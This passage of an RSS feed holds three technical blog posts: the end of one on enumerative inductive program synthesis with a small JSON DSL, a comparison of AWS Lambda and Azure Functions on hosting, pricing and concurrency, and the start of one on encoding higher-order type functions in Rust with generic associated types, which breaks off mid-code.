   <td>["if", "boolean??", ["block", "??"], ""],
   </td>
  </tr>
</tbody></table>
<p>In the DSL description, "??" stands for an undefined value, that can be replaced with an expression or a variable. This notation is taken from <a href="#sketch" id="ref2">SKETCH language</a>, where "??" represents a <em>hole,</em> a placeholder that the synthesizer can replace with an integer constant.</p>
<p>Some undefined values have annotated types. For example "number??" means that the argument should be replaced with an expression that has "number" return value. This allows for additional limitations on the search space.</p>
<h3>Algorithm for program generation</h3>
<p>How to generate all programs that can be represented with the DSL? The algorithm is fairly simple: start with some undefined values, and iteratively replace them with all possible options picked from the list of DSL expressions. Selected and pasted expressions would contain some undefined values of their own, so the process is repeated until all the options are used, or until expressions tree depth reaches some limit.</p>
<p>It’s like iterative template rewriting, and it’s easier to demonstrate with an example:</p>
<table>
<tbody><tr>
	<td>1. Start with an empty/undefined program </td>
	<td>["??", "??", "??", "??"] </td>
</tr>
<tr>
	<td>2. Traverse the expressions tree, and pick the first occurring undefined value </td>
	<td>[<span>"??"</span>, "??", "??", "??"] </td>
</tr>
<tr>
	<td>3. List all options for replacing this value (expressions that have an empty return type) </td>
	<td><span>["set_index", "output", "number??", "number??", ""]</span><br>
		["if", "boolean??", ["block", "??"], ""]<br>
		["if", "boolean??", ["block", "??"], ""]
	</td>
</tr>
<tr>
	<td>4. Repace undefined value with the first option </td>
	<td>[<span>["set_index", "output", "number??", "number??", ""]</span>, "??", "??" ,"??"] </td>
</tr>
</tbody></table>
<p>Steps 2-4 are repeated iteratively. Expressions tree is traversed depth-first, and each found leaf corresponds to a unique program. Press “next” button in the demo below, to see next iterations.</p>


<div id="demo2">

	<p>
		Demo: iterative program generation
	</p>

	<p>step</p>
	<p>reset</p>

	
</div>

<p>Generated programs are verified with the given input-output examples:</p>
<ol>
<li>Translate from JSON represenation to Javascript</li>
<li>Fill pre-defined input array variable with an example</li>
<li>Evaluate the program with eval()</li>
<li>Check if contents of the pre-defined output variable correspond to the output example.</li>
</ol>
<p>The demo below shows program generation for "array reversal" problem. Press “generate” button to see continuous generation, or use “next” to see generation steps. It generates and checks around a million of short programs per minute, and is able so solve the problem in ~10-20s. I tweaked the DSL to have a bare minimum of available expressions, for search to be faster. Size of the program is also limited by number of used varialbes (limited to 4). It would still work with larger more generic DSL, just would take more time.</p>

<div id="demo5">

	<p>
		Demo: generate a program for reversing an array.
	</p>

	<p>step</p>
	<p>generate</p>
	<p>stop</p>
	<p>reset</p>

	<div>

		<div>

			<p>Input/output examples</p>
			

			<p>Generated program</p>
			

			<p>Evaluation result</p>
			
		</div>

		

	</div>
</div>

<p>Some more examples are show below. They also have custom DSLs tuned for each problem, so that it does not take too much time (~10-20s).</p>


<h3> Example: generate a program that finds sum of array elements</h3>

<div id="demo3">

	<p>
		Demo: generate a program that finds sum of array elements
	</p>

	<p>step</p>
	<p>generate</p>
	<p>stop</p>
	<p>reset</p>

	<div>

		<div>

			<p>Input/output examples</p>
			

			<p>Generated program</p>
			

			<p>Evaluation result</p>
			
		</div>

		

	</div>
</div>



<h3> Example: generate a program that finds max element in an array</h3>

<div id="demo4">

	<p>
		Demo: generate a program that finds max element in an array
	</p>

	<p>step</p>
	<p>generate</p>
	<p>stop</p>
	<p>reset</p>

	<div>

		<div>

			<p>Input/output examples</p>
			

			<p>Generated program</p>
			

			<p>Evaluation result</p>
			
		</div>

		

	</div>
</div>

<h2>Refenences &amp; links</h2>
<p>(book) <a href="https://rishabhmit.bitbucket.io/papers/program_synthesis_now.pdf">Program Synthesis</a><br>
Sumit Gulwani, Oleksandr Polozov, Rishabh Singh</p>
<p>(course materials) Introduction to Program Synthesis<br>
<a href="http://people.csail.mit.edu/asolar/SynthesisCourse/Lecture2.htm">http://people.csail.mit.edu/asolar/SynthesisCourse/Lecture2.htm</a></p>
<h3>Papers</h3>
<p><a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.367.9604&amp;rep=rep1&amp;type=pdf">Dimensions in Program Synthesis</a><br>
Sumit Gulwani</p>
<p><a href="http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=7EC748B93DCDCE0DABC810450BD07AE1?doi=10.1.1.180.1237&amp;rep=rep1&amp;type=pdf">Inductive Programming (A Survey of Program Synthesis Techniques)</a><br>
Emanuel Kitzelmann</p>
<p><span id="examples"><a href="#ref1">↑</a></span><br>
Scaling Enumerative Program Synthesis via Divide and Conquer<br>
Rajeev Alur, Arjun Radhakrishna, and Abhishek Udupa</p>
<p>CVC4SY for SyGuS-COMP 2019<br>
Andrew Reynolds, Haniel Barbosa, Andres Nötzli, Clark Barrett, Cesare Tinelli</p>
<p><span id="sketch"><a href="#ref2">↑</a></span><br>
The Sketching Approach to Program Synthesis<br>
Armando Solar-Lezama</p>
<h3>Blog posts</h3>
<p><a href="https://thegradient.pub/p/577a122d-df49-4e1f-8dc3-324f5c784236/">Software that writes software: on program synthesis</a><br>
Adithya Ganesh</p>
<p><a href="https://barghouthi.github.io/2017/04/24/synthesis-primer/">A Program Synthesis Primer </a><br>
Aws Albarghouthi</p>
<p><a href="https://alexpolozov.com/blog/program-synthesis-2018/">Program Synthesis in 2017-18</a><br>
Alex Polozov</p>
<p><a href="https://www.cs.cornell.edu/~asampson/blog/minisynth.html">Program Synthesis is Possible</a><br>
Adrian Sampson</p>
<p><a href="https://blog.sigplan.org/2020/03/25/homoiconicity-lisp-and-program-synthesis/">Homoiconicity, Lisp, and Program Synthesis</a><br>
Rajesh Jayaprakash</p>
<p><a href="https://blog.sigplan.org/2019/07/31/program-synthesis-in-2019/">Program Synthesis in 2019</a><br>
<a href="https://www.cs.utexas.edu/~bornholt/post/synthesis-explained.html">Program Synthesis Explained</a><br>
<a href="https://www.cs.utexas.edu/~bornholt/post/building-synthesizer.html">Building a Program Synthesizer</a><br>
<a href="https://blog.sigplan.org/2019/11/26/building-your-first-program-synthesizer/">Building Your First Program Synthesizer</a><br>
James Bornholt</p>


			</div></div>]]>
            </description>
            <link>https://grgv.xyz/inductive_program_synthesis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25705059</guid>
            <pubDate>Sat, 09 Jan 2021 21:38:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Lambda vs. Azure Functions: 10 Major Differences]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25704936">thread link</a>) | @tacon
<br/>
January 9, 2021 | https://iamondemand.com/blog/aws-lambda-vs-azure-functions-ten-major-differences/ | <a href="https://web.archive.org/web/*/https://iamondemand.com/blog/aws-lambda-vs-azure-functions-ten-major-differences/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="15b005c9" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
					<div data-elementor-type="wp-post" data-elementor-id="4344" data-elementor-settings="[]">
						<div>
							<div>
							<section data-id="54feab4" data-element_type="section">
						<div>
							<div>
					<div data-id="e39972b" data-element_type="column">
			<div>
							<div>
						<div data-id="fddd529" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Forget about managing virtual machines or paying for idle hardware! Serverless compute brings unlimited scale and high availability to every company in the world, from small startups to multinational corporations. At least, that’s the vision of Amazon and Microsoft, today’s biggest cloud vendors.</span></p><p><span>AWS Lambda pioneered the Function as a Service (FaaS) application model in 2014. With Faas, a small piece of code—called a function—is deployed as a ZIP file and linked to a specific type of event, such as a queue or an HTTP endpoint. AWS runs this function every time a matching event occurs, be it once per day or a thousand times per second.</span></p><p><span>Since 2014, the serverless model has taken off, and every major cloud provider has introduced its flavor of an FaaS service: Azure Functions, Google Cloud Functions, and IBM Cloud Functions, to name a few. While the basic idea behind all the offerings is the same, there are many differences between these implementations.</span></p><p><span>Today, I’ll compare AWS Lambda with Azure Functions (Lambda’s equivalent in Azure cloud), focusing on their unique features and limitations. Here are the ten major differences between the two options.</span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="7d8498c" data-element_type="section">
						<div>
							<div>
					<div data-id="e80d08f" data-element_type="column">
			<div>
							<div>
						<div data-id="d24e788" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>To put it simply, there is one way to run a serverless function in AWS: <a href="https://iamondemand.com/blog/how-i-simplified-my-lambda-deployments/" target="_blank" rel="noopener noreferrer">deploy it</a> to the AWS Lambda service. Amazon’s strategy here is to make sure that this service covers as many customer scenarios as possible, ranging from hobby websites to enterprise-grade data processing systems.</span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="b6360b3" data-element_type="section">
						<div>
							<div>
					<div data-id="b7d9665" data-element_type="column">
			<div>
							<div>
						<div data-id="fd4d1bf" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span><strong>Microsoft takes a different approach.</strong> They separated the notion of the Azure Functions programming model from the serverless operational model. </span></p><p><span>With Azure Functions, I can deploy my functions to a pay-per-use, fully-managed Consumption plan. However, I can also use </span><a href="https://docs.microsoft.com/en-us/azure/azure-functions/functions-scale" target="_blank" rel="noopener noreferrer"><span>other hosting options</span></a><span> to run the same code:</span></p><ul><li><ul><li><ul><li><span><strong>App Service plan</strong>: provides a predictable pay-per-hour price, but has limited auto-scaling behavior</span></li><li><span><strong>Premium plan (preview)</strong>: gives reserved capacity </span><i><span>and</span></i><span> elastic scaling, combined with advanced networking options, for a higher price</span></li><li><span><strong>A Docker container</strong>: can run anywhere on self-managed infrastructure</span></li><li><span><strong>Kubernetes-based event-driven architecture (KEDA, experimental)</strong>: brings functions to Kubernetes, running in any cloud or on-premises</span></li></ul></li></ul></li></ul><p><span>The Consumption plan has the lowest management overhead and no fixed-cost component, which makes it the most serverless hosting option on the list. For that reason, I’m going to focus on AWS Lambda vs. Azure Functions Consumption plan for the rest of this article.</span></p><p><span>When deploying an </span><a href="https://docs.aws.amazon.com/lambda/latest/dg/resource-model.html" target="_blank" rel="noopener noreferrer"><span>AWS Lambda function</span></a><span>, I need to define the maximum memory allocation, which has to be between 128MB and 3GB. The CPU power and cost of running the function are proportional to the allocated memory. It takes a bit of experimentation to define the optimal size, depending on the workload profile. Regardless of size, all instances run on Amazon Linux.</span></p><p><span>On the other hand, Azure Functions Consumption plan is one-size-fits-all. It comes with 1.5GB of memory and one low-profile virtual core. You can choose between Windows and Linux as a host operating system.</span></p><p><a href="https://docs.microsoft.com/en-us/azure/azure-functions/functions-premium-plan#plan-and-sku-settings" target="_blank" rel="noopener noreferrer"><span>Azure Functions Premium plan</span></a><span> comes with multiple instance sizes, up to 14GB of memory, and four vCPUs. However, you have to pay a fixed per-hour fee for the reserved capacity.</span></p><p><span>AWS Lambda natively supports JavaScript, Java, Python, Go, C#, F#, PowerShell, and Ruby code.</span></p><p><span>Azure Functions has runtimes for JavaScript, Java, Python, C#, F#, and PowerShell (preview). Azure lacks Go and Ruby—otherwise, the language options are very similar.</span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="5e255a2" data-element_type="section">
						<div>
							<div>
					<div data-id="17c9936" data-element_type="column">
			<div>
							<div>
						<div data-id="24ac72d" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span><em>IOD is a content creation agency. Our tech experts create tech content that leads people to your tech blog. <a href="https://iamondemand.com/success-stories/" target="_blank" rel="noopener"><span>Learn</span> <span>more</span></a>.</em></span></p>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="9f5ad03" data-element_type="section">
						<div>
							<div>
					<div data-id="aef234e" data-element_type="column">
			<div>
							<div>
						<div data-id="686f22b" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Specifics vary between runtimes, but, overall, AWS Lambda has a </span><a href="https://docs.aws.amazon.com/lambda/latest/dg/lambda-services.html" target="_blank" rel="noopener noreferrer"><span>straightforward programming model</span></a><span>. A function receives a JSON object as input and may return another JSON as output. The event type defines the schema of those objects, which are documented and defined in language SDKs.</span></p><p><span>Azure Functions has a more sophisticated model based on </span><a href="https://docs.microsoft.com/en-us/azure/azure-functions/functions-triggers-bindings" target="_blank" rel="noopener noreferrer"><span>triggers and bindings</span></a><span>. A trigger is an event that the function listens to. The function may have any number of input and output bindings to pull and/or push extra data at the time of processing. For example, an HTTP-triggered function can also read a document from Azure Cosmos DB and send a queue message, all done declaratively via binding configuration.</span></p><p><span>The implementation details differ per language runtime. The binding system provides extra flexibility, but it also brings some complexity, in terms of both API and configuration.</span></p><p><span>One drawback of all FaaS services on the market is the limited set of supported event types. For example, if you want to trigger your functions from a Kafka topic, you are out of luck on both AWS and Azure.</span></p><p><span>Other aspects of serverless functions are more customizable. AWS Lambda defines a </span><a href="https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html" target="_blank" rel="noopener noreferrer"><span>concept of layers</span></a><span>: a distribution mechanism for libraries, custom runtimes to support other languages, and other dependencies. </span></p><p><span>Azure Functions enables open </span><a href="https://github.com/Azure/azure-webjobs-sdk-extensions/wiki/Binding-Extensions-Overview" target="_blank" rel="noopener noreferrer"><span>binding extensions</span></a><span> so that the community can create new types of bindings and bring them into Function Apps.</span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="da33380" data-element_type="section">
						
		</section>
				<section data-id="509f65d" data-element_type="section">
						
		</section>
				<section data-id="cc4cd47" data-element_type="section">
						
		</section>
				<section data-id="49d6d240" data-element_type="section">
						<div>
							<div>
					<div data-id="6c138dd2" data-element_type="column">
			<div>
							<div>
						<div data-id="1ae1cb03" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Both services can run multiple (potentially thousands) executions of the same function simultaneously, each handling one incoming event.</span></p><p><span>AWS Lambda always reserves a separate instance for a single execution. Each execution has its exclusive pool of memory and CPU cycles. Therefore, the performance is entirely predictable and stable.</span></p><p><span>Azure Functions allocates multiple concurrent executions to the same virtual node. If one execution is idle waiting for a response from the network, other executions may use resources which would otherwise be wasted. However, resource-hungry executions may fight for the pool of shared resources, harming the overall performance and processing time.</span></p><p><span>Serverless pricing is based on a pay-per-usage model. Both services have two cost components: pay-per-call and pay-per-GB*seconds. The latter is a metric combining execution time and consumed memory.</span></p><p><span>Moreover, the price tag for both services is almost exactly the same: $0.20 per million requests and $16 per million GB*seconds ($16.67 for AWS). One million executions running for 100 ms each and consuming 1GB of memory cost less than $2. Since AWS Lambda was the first on the market, I assume Microsoft just copied the numbers.</span></p><p><span>There are some differences in the details, though:</span></p><ul><li><span>AWS Lambda charges for full provisioned memory capacity, while Azure Functions measures the actual average memory consumption of executions.</span></li><li><span>If Azure Function’s executions share the instance, the memory cost isn’t charged multiple times, but shared between executions, which may lead to noticeable reductions.</span></li><li><span>Both services charge for at least 100 ms and 128MB for each execution. AWS rounds the time up to the nearest 100 ms, while Azure rounds up to 1 ms.</span></li><li><span>CPU profiles are different for Lambda and Functions, which may lead to different durations for comparable workloads.</span></li></ul><p><span>I wrote more on how to measure the cost of Azure Functions&nbsp;</span><a href="https://mikhail.io/2019/08/how-to-measure-the-cost-of-azure-functions/" target="_blank" rel="noopener noreferrer"><span>here</span></a><span>.</span></p><p><span>AWS Lambda used to require Amazon API Gateway to listen to HTTP traffic, which came at a massive additional cost. Recently, Amazon introduced&nbsp;</span><a href="https://aws.amazon.com/about-aws/whats-new/2018/11/alb-can-now-invoke-lambda-functions-to-serve-https-requests/" target="_blank" rel="noopener noreferrer"><span>integration with Elastic Load Balancing</span></a><span>, which may be more cost efficient for high-load scenarios. However, the pricing is per hour, so good judgment is required.</span></p><p><span>Azure Functions comes with HTTP endpoint integration out of the box, and there is no additional cost for this integration.</span></p><p><span>AWS Lambda has been on the market longer than Azure Functions, and has a laser focus on the single-hosting model. Although there are no established industry-wide benchmarks, many claim that AWS Lambda is better for rapid scale-out and handling massive workloads, both for web APIs and queue-based applications. The bootstrapping delay effect—cold starts—are also less significant with Lambda.</span></p><p><span>Azure Functions has improved significantly in the last year or two, but Microsoft is still playing catch-up.</span></p><p><span>Serverless functions are nanoservices: small blocks of code doing just one thing. The question of how to build large applications and systems out of those tiny pieces is still open, but some composition patterns already exist.</span></p><p><span>Both AWS and Azure have dedicated services for workflow orchestration: AWS Step Functions and Azure Logic Apps. Quite often, functions are used as steps in those workflows, allowing them to stay independent but still solve significant tasks.</span></p><p><span>In addition, </span><a href="https://docs.microsoft.com/en-us/azure/azure-functions/durable/durable-functions-overview" target="_blank" rel="noopener noreferrer"><span>Azure Durable Functions</span></a><span> is a library that brings workflow orchestration abstractions to code. It comes with several patterns to combine multiple serverless functions into stateful long-running flows. The library handles communication and state management robustly and transparently, while keeping the API surface simple.&nbsp;</span></p><p><span>AWS Lambda and Azure Functions are similar services, but the devil is in the details—and virtually every angle shows some essential distinctions between the two. My list of ten differences is certainly not exhaustive, and each aspect would need a separate article to cover it in full.</span></p><p><span>It’s unlikely that your choice will be driven purely by these differences. At the same time, whenever you have to choose one option over the other, or when <a href="https://iamondemand.com/blog/azure-user-heres-what-you-must-know-about-aws/" target="_blank" rel="noopener noreferrer">you switch between providers</a>, it’s crucial to adjust your thinking and practices to match the peculiarities.</span></p><p><span>In short, choose the option that fits you best!</span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="1d70780" data-element_type="section">
						<div>
							<div>
					<div data-id="d4c56cf" data-element_type="column">
			<div>
							<div>
						<div data-id="7626217" data-element_type="widget" data-widget_type="call-to-action.default">
				<div>
					<div>
					
							<div>
				
									<h2>
						Are you a tech …</h2></div></div></div></div></div></div></div></div></div></section></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://iamondemand.com/blog/aws-lambda-vs-azure-functions-ten-major-differences/">https://iamondemand.com/blog/aws-lambda-vs-azure-functions-ten-major-differences/</a></em></p>]]>
            </description>
            <link>https://iamondemand.com/blog/aws-lambda-vs-azure-functions-ten-major-differences/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25704936</guid>
            <pubDate>Sat, 09 Jan 2021 21:25:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generic associated types encode higher-order functions on types]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25704895">thread link</a>) | @lukastyrychtr
<br/>
January 9, 2021 | https://willcrichton.net/notes/gats-are-hofs/ | <a href="https://web.archive.org/web/*/https://willcrichton.net/notes/gats-are-hofs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  <p>
    
    Will Crichton
    
    &nbsp; — &nbsp;
    January 4, 2021
  </p>
  <p>GATs allow type parameters to associated types in traits. This feature enables total type-level functions to be associated to structs. I show how to use this pattern to implement higher-order type-level functions, and how to use specialization to make partial functions into total functions.</p>
  <p><em>Part of an ongoing series about type-level programming in Rust. Read <a href="http://willcrichton.net/notes/type-level-programming/">part one</a> first!<br></em></p>

<p>With <a href="https://github.com/rust-lang/rfcs/blob/master/text/1598-generic_associated_types.md">generic associated types</a> landing recently in Rust nightly, I’ve been wondering: what expressive power does this feature add to type-level programming? The answer is <strong>higher-order functions on types</strong>, and in this post I’ll explain what that means and how it works.</p>

<h2 id="a-refresher-on-type-level-programming">A refresher on type-level programming</h2>

<p>Using a pure functional programming style, we can define objects like a list of types. For example, using <a href="https://github.com/willcrichton/tyrade">tyrade</a>, my type-level programming language:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>enum</span> <span>TList</span> <span>{</span>
    <span>TNil</span><span>,</span>
    <span>TCons</span><span>(</span><span>Type</span><span>,</span> <span>TList</span><span>)</span>
  <span>}</span>

  <span>enum</span> <span>TOption</span> <span>{</span>
    <span>TNone</span><span>,</span>
    <span>TSome</span><span>(</span><span>Type</span><span>)</span>
  <span>}</span>

  <span>// Get the Nth item from the list, where Index is either Z or S&lt;N&gt;</span>
  <span>fn</span> <span>Nth</span><span>&lt;</span><span>List</span><span>,</span> <span>Index</span><span>&gt;</span><span>()</span> <span>{</span>
    <span>match</span> <span>List</span> <span>{</span>
      <span>TNil</span> <span>=&gt;</span> <span>TNone</span><span>,</span>
      <span>TCons</span><span>(</span><span>X</span><span>,</span> <span>XS</span><span>)</span> <span>=&gt;</span> <span>match</span> <span>Index</span> <span>{</span>
        <span>Z</span> <span>=&gt;</span> <span>TSome</span><span>(</span><span>X</span><span>),</span>
        <span>S</span><span>(</span><span>IMinusOne</span><span>)</span> <span>=&gt;</span> <span>Nth</span><span>(</span><span>XS</span><span>,</span> <span>IMinusOne</span><span>)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>// checks that Nth([i32, f32], 1) == Some(f32)</span>
  <span>assert_type_eq</span><span>::</span><span>&lt;</span>
    <span>Nth</span><span>&lt;</span><span>TCons</span><span>&lt;</span><span>i32</span><span>,</span> <span>TCons</span><span>&lt;</span><span>f32</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span><span>,</span> <span>S</span><span>&lt;</span><span>Z</span><span>&gt;&gt;</span><span>,</span>
    <span>TSome</span><span>&lt;</span><span>f32</span><span>&gt;</span>
  <span>&gt;</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>The <code>tyrade!</code> procedural macro compiles the pseudo-Rust notation into a series of structs, traits, and impls. For example:</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>TNil</span><span>;</span>
<span>pub</span> <span>struct</span> <span>TCons</span><span>&lt;</span><span>T0</span><span>,</span> <span>T1</span><span>&gt;</span><span>(</span><span>...</span><span>);</span>

<span>pub</span> <span>trait</span> <span>ComputeNth</span><span>&lt;</span><span>Index</span><span>&gt;</span> <span>{</span>
    <span>type</span> <span>Output</span><span>;</span>
<span>}</span>
<span>pub</span> <span>type</span> <span>Nth</span><span>&lt;</span><span>List</span><span>,</span> <span>Index</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>List</span> <span>as</span> <span>ComputeNth</span><span>&lt;</span><span>Index</span><span>&gt;&gt;</span><span>::</span><span>Output</span><span>;</span>

<span>impl</span><span>&lt;</span><span>Index</span><span>&gt;</span> <span>ComputeNth</span><span>&lt;</span><span>Index</span><span>&gt;</span> <span>for</span> <span>TNil</span> <span>{</span>
    <span>type</span> <span>Output</span> <span>=</span> <span>TNone</span><span>;</span>
<span>}</span>
<span>impl</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span> <span>ComputeNth</span><span>&lt;</span><span>Z</span><span>&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
<span>where</span> <span>X</span><span>:</span> <span>ComputeTSome</span> <span>{</span>
    <span>type</span> <span>Output</span> <span>=</span> <span>TSome</span><span>&lt;</span><span>X</span><span>&gt;</span><span>;</span>
<span>}</span>
<span>impl</span><span>&lt;</span><span>IMinusOne</span><span>,</span> <span>X</span><span>,</span> <span>XS</span><span>&gt;</span> <span>ComputeNth</span><span>&lt;</span><span>S</span><span>&lt;</span><span>IMinusOne</span><span>&gt;&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
<span>where</span> <span>XS</span><span>:</span> <span>ComputeNth</span><span>&lt;</span><span>IMinusOne</span><span>&gt;</span> <span>{</span>
    <span>type</span> <span>Output</span> <span>=</span> <span>Nth</span><span>&lt;</span><span>XS</span><span>,</span> <span>IMinusOne</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<blockquote>
  <p>See my explainer on <a href="https://willcrichton.net/notes/type-level-programming/">type-level programming</a> if you are confused about the correspondence between these programs.</p>
</blockquote>

<h2 id="higher-order-functions-on-types">Higher-order functions on types</h2>

<p>For me, Tyrade is a explicit representation of my mental model for type-level programming. Once I conceptually understood the correspondences between type-level enums and structs, or between type-level functions and traits, then I reified that understanding into the Tyrade compiler.</p>

<p>However, trait/function correspondence only worked when the arguments to type-level functions were types. To explain, we’ll use the running example of a list map function. The goal is to write it in Tyrade like this:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>Map</span><span>&lt;</span><span>List</span><span>,</span> <span>Func</span><span>&gt;</span><span>()</span> <span>{</span>
    <span>match</span> <span>List</span> <span>{</span>
      <span>TNil</span> <span>=&gt;</span> <span>TNil</span><span>,</span>
      <span>TCons</span><span>(</span><span>X</span><span>,</span> <span>XS</span><span>)</span> <span>=&gt;</span> <span>TCons</span><span>(</span><span>Func</span><span>(</span><span>X</span><span>),</span> <span>Map</span><span>(</span><span>XS</span><span>,</span> <span>Func</span><span>))</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Then we could use the <code>Map</code> type function like this:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>TIsZero</span><span>&lt;</span><span>N</span><span>&gt;</span><span>()</span> <span>{</span>
    <span>match</span> <span>N</span> <span>{</span>
      <span>Z</span> <span>=&gt;</span> <span>TTrue</span><span>,</span>
      <span>S</span><span>(</span><span>N1</span><span>)</span> <span>=&gt;</span> <span>TFalse</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>assert_type_eq</span><span>::</span><span>&lt;</span>
    <span>Map</span><span>&lt;</span>
      <span>TCons</span><span>&lt;</span><span>Z</span><span>,</span> <span>TCons</span><span>&lt;</span><span>S</span><span>&lt;</span><span>Z</span><span>&gt;</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span><span>,</span>
      <span>TIsZero</span>
    <span>&gt;</span><span>,</span>
    <span>TCons</span><span>&lt;</span><span>TTrue</span><span>,</span> <span>TCons</span><span>&lt;</span><span>TFalse</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span>
  <span>&gt;</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>However, the existing translation of <code>Map</code> doesn’t work. It would become:</p>

<div><div><pre><code><span>pub</span> <span>trait</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>{</span>
  <span>type</span> <span>Output</span><span>;</span>
<span>}</span>
<span>pub</span> <span>type</span> <span>Map</span><span>&lt;</span><span>List</span><span>,</span> <span>Func</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>List</span> <span>as</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;&gt;</span><span>::</span><span>Output</span><span>;</span>

<span>impl</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>for</span> <span>TNil</span> <span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TNil</span><span>;</span>
<span>}</span>
<span>impl</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>,</span> <span>Func</span><span>&gt;</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
<span>where</span> <span>XS</span><span>:</span> <span>ComputeMap</span><span>&lt;</span><span>Func</span><span>&gt;</span> <span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TCons</span><span>&lt;</span><span>Func</span><span>&lt;</span><span>X</span><span>&gt;</span><span>,</span> <span>Map</span><span>&lt;</span><span>XS</span><span>,</span> <span>Func</span><span>&gt;&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>And this code fails to compile because <code>Func</code> can’t be invoked with a parameter:</p>

<div><div><pre><code>error[E0109]: type arguments are not allowed for this type
    |
    |     type Output = TCons&lt;Func&lt;X&gt;, Map&lt;XS, Func&gt;&gt;;
    |                              ^ type argument not allowed
</code></pre></div></div>

<p>Herein lies the crux of the issue: type variables (i.e. impl quantifiers) are only allowed to be of kind <code>type</code>, and not of kind <code>type -&gt; type</code>. To get higher-order type functions, we need Rust to support higher-kinded types (HKT). While Rust doesn’t support HKT directly, the addition of generic associated types (GATs) enables a pseudo-HKT pattern. See <a href="http://smallcultfollowing.com/babysteps/blog/2016/11/03/associated-type-constructors-part-2-family-traits/">Niko’s extended discussion</a> for the gory details.</p>

<h2 id="implementing-hofs-with-hkts-with-gats">Implementing HOFs with HKTs with GATs</h2>

<p><code>TIsZero</code> cannot be passed directly into <code>ComputeMap</code>, so the key idea is to create a proxy object <code>TIsZeroProxy</code> which can be passed in. Using GATs, we associate the <code>TIsZeroProxy</code> back to <code>TIsZero</code> in a way that can be referenced within <code>ComputeMap</code>. First, the proxy:</p>

<div><div><pre><code><span>pub</span> <span>trait</span> <span>FuncProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>&gt;</span><span>;</span>
<span>}</span>

<span>pub</span> <span>struct</span> <span>TIsZeroProxy</span><span>;</span>
<span>impl</span> <span>FuncProxy</span> <span>for</span> <span>TIsZeroProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>TIsZero</span><span>&lt;</span><span>T</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Then the implementation of <code>ComputeMap</code> can be parameterized by any type implementing <code>FuncProxy</code>:</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>,</span> <span>Proxy</span><span>&gt;</span> <span>ComputeMap</span><span>&lt;</span><span>Proxy</span><span>&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
